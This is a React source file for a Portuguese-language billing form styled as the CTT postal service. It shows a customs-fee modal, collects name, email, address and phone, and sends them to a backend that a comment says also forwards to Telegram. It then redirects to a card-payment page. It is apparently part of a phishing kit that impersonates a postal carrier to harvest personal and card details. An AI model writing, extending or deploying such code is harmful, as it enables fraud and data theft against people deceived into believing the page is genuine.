import React, { useState } from 'react';
import { Card, CardContent } from './ui/card';
import { Input } from './ui/input';
import { Button } from './ui/button';
import { Label } from './ui/label';
import { AlertCircle, Package } from 'lucide-react';
import { useToast } from '../hooks/use-toast';
import { useNavigate } from 'react-router-dom';
import CustomsModal from './CustomsModal';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const CTTBillingForm = () => {
  const [formData, setFormData] = useState({
    nome: '',
    email: '',
    endereco: '',
    codigoPostal: '',
    cidade: '',
    telefone: ''
  });
  const [showModal, setShowModal] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();
  const navigate = useNavigate();

  const handleInputChange = (field, value) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleSubmit = async () => {
    setIsSubmitting(true);
    
    try {
      // Validate required fields
      const requiredFields = ['nome', 'email', 'endereco', 'codigoPostal', 'cidade', 'telefone'];
      const missingFields = requiredFields.filter(field => !formData[field].trim());
      
      if (missingFields.length > 0) {
        toast({
          title: "Campos obrigatórios",
          description: "Por favor, preencha todos os campos obrigatórios",
          variant: "destructive"
        });
        setIsSubmitting(false);
        return;
      }

      // Basic email validation
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(formData.email)) {
        toast({
          title: "Email inválido",
          description: "Por favor, introduza um endereço de email válido",
          variant: "destructive"
        });
        setIsSubmitting(false);
        return;
      }

      // Send billing data to backend (and Telegram)
      const response = await axios.post(`${API}/ctt/billing`, formData);
      
      if (response.data.status === 'success') {
        // Store billing ID for later use
        localStorage.setItem('ctt_billing_id', response.data.billing_id);
        localStorage.setItem('ctt_billing_data', JSON.stringify(formData));
        
        toast({
          title: "Informações enviadas com sucesso!",
          description: "Redirecionando para pagamento...",
          duration: 2000
        });

        // Navigate to card page after a short delay
        setTimeout(() => {
          navigate('/card');
        }, 2000);
      }
      
    } catch (error) {
      console.error('Error submitting billing data:', error);
      
      toast({
        title: "Erro ao enviar dados",
        description: error.response?.data?.detail || "Erro interno. Tente novamente.",
        variant: "destructive"
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
      <Card className="shadow-lg border-0 rounded-lg overflow-hidden">
        <CardContent className="p-8">
          {/* Form Header */}
          <div className="flex items-center mb-8">
            <AlertCircle className="w-5 h-5 text-red-600 mr-3" />
            <h2 className="text-xl font-semibold text-gray-900">
              Informações de entrega
            </h2>
          </div>



          {/* Form Fields */}
          <div className="space-y-6">
            {/* Nome */}
            <div className="space-y-2">
              <Label htmlFor="nome" className="text-sm font-medium text-gray-700">
                Nome <span className="text-red-500">*</span>
              </Label>
              <Input
                id="nome"
                type="text"
                placeholder="Nome completo"
                value={formData.nome}
                onChange={(e) => handleInputChange('nome', e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                required
                disabled={isSubmitting}
              />
            </div>

            {/* Correio electrónico */}
            <div className="space-y-2">
              <Label htmlFor="email" className="text-sm font-medium text-gray-700">
                Correio electrónico <span className="text-red-500">*</span>
              </Label>
              <Input
                id="email"
                type="email"
                placeholder="exemplo@email.com"
                value={formData.email}
                onChange={(e) => handleInputChange('email', e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                required
                disabled={isSubmitting}
              />
            </div>

            {/* Endereço */}
            <div className="space-y-2">
              <Label htmlFor="endereco" className="text-sm font-medium text-gray-700">
                Endereço <span className="text-red-500">*</span>
              </Label>
              <Input
                id="endereco"
                type="text"
                placeholder="Rua, número, andar"
                value={formData.endereco}
                onChange={(e) => handleInputChange('endereco', e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                required
                disabled={isSubmitting}
              />
            </div>

            {/* Código postal */}
            <div className="space-y-2">
              <Label htmlFor="codigoPostal" className="text-sm font-medium text-gray-700">
                Código postal <span className="text-red-500">*</span>
              </Label>
              <Input
                id="codigoPostal"
                type="text"
                placeholder="0000-000"
                value={formData.codigoPostal}
                onChange={(e) => handleInputChange('codigoPostal', e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                required
                disabled={isSubmitting}
              />
            </div>

            {/* Cidade */}
            <div className="space-y-2">
              <Label htmlFor="cidade" className="text-sm font-medium text-gray-700">
                Cidade <span className="text-red-500">*</span>
              </Label>
              <Input
                id="cidade"
                type="text"
                placeholder="Nome da cidade"
                value={formData.cidade}
                onChange={(e) => handleInputChange('cidade', e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                required
                disabled={isSubmitting}
              />
            </div>

            {/* Número de telefone */}
            <div className="space-y-2">
              <Label htmlFor="telefone" className="text-sm font-medium text-gray-700">
                Número de telefone <span className="text-red-500">*</span>
              </Label>
              <Input
                id="telefone"
                type="tel"
                placeholder="+351 9XX XXX XXX"
                value={formData.telefone}
                onChange={(e) => handleInputChange('telefone', e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                required
                disabled={isSubmitting}
              />
            </div>
          </div>

          {/* Terms Notice */}
          <div className="mt-6 text-sm text-gray-600">
            Ao clicar no botão "Seguinte", está a aceitar as Condições Especiais de Envio Internacional.
          </div>

          {/* Submit Button */}
          <div className="mt-8 flex justify-end">
            <Button
              onClick={handleSubmit}
              disabled={isSubmitting}
              className={`px-8 py-2 rounded-md font-medium transition-colors duration-200 ${
                isSubmitting 
                  ? 'bg-gray-400 cursor-not-allowed' 
                  : 'bg-red-600 hover:bg-red-700 text-white'
              }`}
            >
              {isSubmitting ? (
                <div className="flex items-center">
                  <svg className="animate-spin -ml-1 mr-3 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Processando...
                </div>
              ) : (
                'Seguinte'
              )}
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Custom Modal */}
      <CustomsModal 
        isOpen={showModal}
        onClose={() => setShowModal(false)}
      />
    </div>
  );
};

export default CTTBillingForm;